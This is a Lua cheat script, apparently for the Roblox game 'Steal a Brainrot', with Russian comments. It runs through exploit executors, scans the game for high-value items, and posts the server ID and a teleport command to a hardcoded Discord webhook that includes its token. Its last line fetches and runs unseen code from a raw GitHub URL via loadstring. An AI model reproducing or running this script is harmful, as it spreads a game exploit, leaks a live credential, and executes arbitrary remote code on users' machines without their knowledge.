-- 🎯 BRAINROT INCOME SCANNER v2.0 (ИНДИВИДУАЛЬНЫЕ ПОРОГИ)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
-- Запуск: автоматически при старте + по клавише F

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ НАСТРОЙКИ
local DEFAULT_THRESHOLD = 50_000_000 -- Порог по умолчанию
local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422238166630400044/3ueuPIMI-MIwesyQvnBVd-3d60iBNk3ZCVCGB4Topy90rNEQ7zgtVGHirj-03PUcSU7b'

print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)

-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ИНДИВИДУАЛЬНЫМИ ПОРОГАМИ
local OBJECTS = {
    ['Garama and Madundung'] = { emoji = '🍝', threshold = 0 },
    ['Dragon Cannelloni'] = { emoji = '🐲', threshold = 0 },
    ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 240000000 },
    ['Esok Sekolah'] = { emoji = '🏠', threshold = 400000000 },
    ['La Supreme Combinasion'] = { emoji = '🔫', threshold = 0 },
    ['Ketupat Kepat'] = { emoji = '🍏', threshold = 180000000 },
    ['Strawberry Elephant'] = { emoji = '🐘', threshold = 0 },
    ['Spaghetti Tualetti'] = { emoji = '🚽', threshold = 500000000 },
    ['Ketchuru and Musturu'] = { emoji = '🍾', threshold = 63000000 },
    ['Tralaledon'] = { emoji = '🦈', threshold = 0 },
    ['Tictac Sahur'] = { emoji = '🕰️', threshold = 150000000 },
    ['Los Primos'] = { emoji = '🙆‍♂️', threshold = 0 },
    ['Tang Tang Keletang'] = { emoji = '📢', threshold = 300000000 },
    ['Money Money Puggy'] = { emoji = '🐶', threshold = 300000000 },
    ['Burguro And Fryuro'] = { emoji = '🍔', threshold = 0 },
    ['Chillin Chili'] = { emoji = '🌶', threshold = 200000000 },
    ['La Secret Combinasion'] = { emoji = '❓', threshold = 187500000 },
    ['Eviledon'] = { emoji = '👹', threshold = 300000000 },
    ['Spooky and Pumpky'] = { emoji = '🎃', threshold = 0 },
    ['La Spooky Grande'] = { emoji = '👻', threshold = 500000000 },
    ['Meowl'] = { emoji = '🐈', threshold = 0 },
    ['Chipso and Queso'] = { emoji = '🧀', threshold = 250000000 },
    ['La Casa Boo'] = { emoji = '👁‍🗨', threshold = 0 },
    ['Headless Horseman'] = { emoji = '🐴', threshold = 0 },
    ['Los Tacoritas'] = { emoji = '🚴', threshold = 999999999 },
    ['Capitano Moby'] = { emoji = '🚢', threshold = 0 },
    ['La Taco Combinasion'] = { emoji = '👒', threshold = 400000000 },
    ['Cooki and Milki'] = { emoji = '🍪', threshold = 0 },
    ['Los Puggies'] = { emoji = '🦮', threshold = 305000000 },
    ['Orcaledon'] = { emoji = '🐡', threshold = 240000000 },
    ['Fragrama and Chocrama'] = { emoji = '🍦', threshold = 0 },
    ['Guest 666'] = { emoji = '㊙️', threshold = 66000000 },
    ['Los Bros'] = { emoji = '📱', threshold = 300000000 },
    ['Lavadorito Spinito'] = { emoji = '📺', threshold = 250000000 },
    ['W or L'] = { emoji = '🪜', threshold = 300000000 },
    ['Fishino Clownino'] = { emoji = '🤡', threshold = 0 },
    ['Mieteteira Bicicleteira'] = { emoji = '💄', threshold = 400000000 },
    ['La Extinct Grande'] = { emoji = '☠️', threshold = 370000000 },
    ['Los Chicleteiras'] = { emoji = '🍼', threshold = 999999999 },
    ['Las Sis'] = { emoji = '☕️', threshold = 350000000 },
    ['Tacorita Bicicleta'] = { emoji = '🌮', threshold = 100000000 },
    ['Los Mobilis'] = { emoji = '📱', threshold = 400000000 },
    ['La Ginger Sekolah'] = { emoji = '🎄', threshold = 400000000 },
    ['La Jolly Grande'] = { emoji = '☃️', threshold = 400000000 },
    ['Swaggy Bros'] = { emoji = '🍹', threshold = 400000000 },
    ['Los Burritos'] = { emoji = '🌯', threshold = 250000000 },
    ['Reinito Sleighito'] = { emoji = '🦌', threshold = 0 },
    ['Dragon Gingerini'] = { emoji = '🫚', threshold = 0 },
    ['Ginger Gerat'] = { emoji = '🌑', threshold = 10000000 },
    ['Jolly Jolly Sahur'] = { emoji = '🏴‍☠️', threshold = 100000000 },
    ['Money Money Reinted'] = { emoji = '🫰', threshold = 250000000 },
    ['Skibidi Toilet'] = { emoji = '🪠', threshold = 0 },
}

-- 💰 ПАРСЕР ДОХОДА
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        return nil
    end
    local val = tonumber(num)
    if not val then
        return nil
    end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
            '%.1fB/s',
            v
        )):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
            '%.1fM/s',
            v
        )):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
            '%.1fK/s',
            v
        )):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    if
        inst:IsA('TextLabel')
        or inst:IsA('TextButton')
        or inst:IsA('TextBox')
    then
        local ok, ct = pcall(function()
            return inst.ContentText
        end)
        if ok and type(ct) == 'string' and #ct > 0 then
            return ct
        end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then
            return t
        end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then
            return v
        end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then
        name = grabText(display)
    end

    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end

    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then
        genText = grabText(generation)
    end

    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if
                child:IsA('TextLabel')
                or child:IsA('TextButton')
                or child:IsA('TextBox')
            then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end

    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

-- 🔍 ФУНКЦИЯ ПОИСКА ПРИБЫЛИ В DEBRIS FOLDER
local function scanDebrisForIncome()
    local DebrisFolder = workspace:FindFirstChild("Debris")
    if not DebrisFolder then 
        print("⚠️ Папка Debris не найдена")
        return {} 
    end

    local results = {}

    for _, inst in ipairs(DebrisFolder:GetDescendants()) do
        if inst.Name == "FastOverheadTemplate" then
            local gui = inst:FindFirstChild("GUI")
            local name = gui and grabText(gui:FindFirstChild("DisplayName")) or nil
            local genInst = gui and gui:FindFirstChild("Generation")
            local genText = genInst and grabText(genInst) or nil
            local genNum = genText and parseGenerationText(genText) or nil

            if name and genNum then
                table.insert(results, { name = name, genText = genText, gen = genNum, location = "Debris" })
            end
        end
    end

    -- Сортировка по доходу (убывание)
    table.sort(results, function(a, b) return a.gen > b.gen end)

    -- Вывод в консоль
    if #results > 0 then
        print("\n📊 НАЙДЕНО В DEBRIS FOLDER:")
        for _, r in ipairs(results) do
            print(string.format("   %s - %s (%.0f/s)", r.name, r.genText, r.gen))
        end
    else
        print("📭 В Debris folder объектов не найдено")
    end

    return results
end

-- 🔍 ПОЛНЫЕ СКАНЕРЫ
local function scanPlots()
    local results = {}
    local Plots = workspace:FindFirstChild('Plots')
    if not Plots then
        return results
    end

    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment
                    and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)
                    local genNum = genText and parseGenerationText(genText)
                        or nil
                    if name and genNum then
                        table.insert(
                            results,
                            { name = name, gen = genNum, location = 'Plot' }
                        )
                    end
                end
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'Runway' }
                    )
                end
            end
        end
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local function recursiveSearch(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' and not processed[child] then
                processed[child] = true
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'World' }
                    )
                end
            end
            pcall(function()
                recursiveSearch(child)
            end)
        end
    end
    recursiveSearch(workspace)
    return results
end

local function scanPlayerGui()
    local results = {}
    local lp = Players.LocalPlayer
    if not lp then
        return results
    end

    local playerGui = lp:FindFirstChild('PlayerGui')
    if not playerGui then
        return results
    end

    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(
                        results,
                        { name = name, gen = genNum, location = 'GUI' }
                    )
                end
            end
            pcall(function()
                searchInGui(child)
            end)
        end
    end
    searchInGui(playerGui)
    return results
end

-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}

    repeat
        collected = {}

        local allSources = {
            scanPlots(),
            scanRunway(),
            scanAllOverheads(),
            scanPlayerGui(),
            scanDebrisForIncome(), -- Добавлен сканирование Debris
        }

        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end

        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen)
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique

        if #collected > 0 then
            break
        end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec

    return collected
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request
        or request
        or (syn and syn.request)
        or (fluxus and fluxus.request)
        or (KRNL_HTTP and KRNL_HTTP.request)
end

local function sendDiscordNotification(filteredObjects)
    local req = getRequester()
    if not req then
        warn('❌ Нет HTTP API в executor')
        return
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    if #filteredObjects == 0 then
        print('🔍 Объектов выше порога не найдено')
        return
    end

    -- Сортируем по доходу (убывание)
    table.sort(filteredObjects, function(a, b)
        return a.gen > b.gen
    end)

    -- Формируем список объектов (без слова "порог" и без локаций World/Debris)
    local objectsList = {}
    for i = 1, math.min(15, #filteredObjects) do
        local obj = filteredObjects[i]
        local cfg = OBJECTS[obj.name] or {}
        local emoji = cfg.emoji or '💰'
        
        -- Исключаем локации "World" и "Debris"
        local locationText = ""
        if obj.location and obj.location ~= "World" and obj.location ~= "Debris" then
            locationText = " | " .. obj.location
        end
        
        table.insert(
            objectsList,
            string.format(
                '%s **%s** (%s)%s',
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen),
                locationText
            )
        )
    end
    local objectsText = table.concat(objectsList, '\n')

    -- Телепорт команда в отдельном блоке для копирования
   local teleportText = string.format("```lua\nlocal ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')\n```", game.PlaceId, game.JobId)

    local payload = {
        username = '🎯 Brainrot Scanner',
        embeds = {
            {
                title = '💎 Найдены объекты!',
                color = 0x2f3136,
                fields = {
                    {
                        name = '🆔 Сервер (Job ID)',
                        value = string.format('```%s```', jobId),
                        inline = false,
                    },
                    {
                        name = '💰 Объекты:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = '🚀 Телепорт (нажмите 📋 чтобы скопировать):',
                        value = teleportText,
                        inline = false,
                    },
                },
                footer = {
                    text = string.format(
                        'Найдено: %d объектов • %s',
                        #filteredObjects,
                        os.date('%H:%M:%S')
                    ),
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }

    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')

    local ok, res = pcall(function()
        return req({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if ok then
        print('✅ Уведомление отправлено в Discord!')
    else
        warn('❌ Ошибка отправки:', res)
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Сканирую все объекты...')
    
    -- Сначала сканируем Debris отдельно для вывода в консоль
    scanDebrisForIncome()
    
    -- Затем собираем все объекты
    local allFound = collectAll(8.0)

    -- Фильтрация по индивидуальным порогам
    local filtered = {}
    for _, obj in ipairs(allFound) do
        local cfg = OBJECTS[obj.name]
        if cfg and obj.gen then
            local threshold = cfg.threshold or DEFAULT_THRESHOLD
            if obj.gen >= threshold then
                table.insert(filtered, obj)
            end
        end
    end

    -- Вывод в консоль
    print('\n📊 ОБЩИЙ ОТЧЕТ:')
    print('Найдено всего объектов:', #allFound)
    print('Выше порога:', #filtered)

    for _, obj in ipairs(filtered) do
        local cfg = OBJECTS[obj.name] or {}
        local emoji = cfg.emoji or '💰'
        local threshold = cfg.threshold or DEFAULT_THRESHOLD

        print(
            string.format(
                '%s %s: %s (%s) - порог: %s',
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen),
                obj.location or 'Unknown',
                formatIncomeNumber(threshold)
            )
        )
    end

    -- Отправляем уведомление если есть что показать
    if #filtered > 0 then
        sendDiscordNotification(filtered)
    else
        print('🔍 Нет объектов выше порога')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === BRAINROT INCOME SCANNER (ИНДИВИДУАЛЬНЫЕ ПОРОГИ) ===')
print('💡 Каждый объект имеет свой порог уведомления')
print('⚙️  Настрой пороги в разделе OBJECTS')
print('📁 Добавлено сканирование Debris folder')

-- Показываем текущие пороги
print('\n📊 ТЕКУЩИЕ ПОРОГИ:')
for name, cfg in pairs(OBJECTS) do
    print(string.format('   %s %s: %s', cfg.emoji, name, formatIncomeNumber(cfg.threshold)))
end
print('')

scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan, DEBOUNCE = 0, 3
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then
        return
    end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.clock()
        if now - lastScan < DEBOUNCE then
            return
        end
        lastScan = now
        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
        scanAndNotify()
    end
end)

print('💡 Нажмите F для повторного сканирования')
print('📱 Discord webhook готов к отправке уведомлений')
print('📁 Debris сканирование активно')

-- Загрузка дополнительного скрипта
loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
